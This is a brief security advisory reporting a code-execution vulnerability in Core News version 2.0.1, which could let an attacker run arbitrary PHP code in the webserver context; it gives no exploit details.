Core News is prone to a code-execution vulnerability.

An attacker can exploit this issue to execute arbitrary malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

Core News version 2.0.1. is vulnerable; other versions may also be affected.
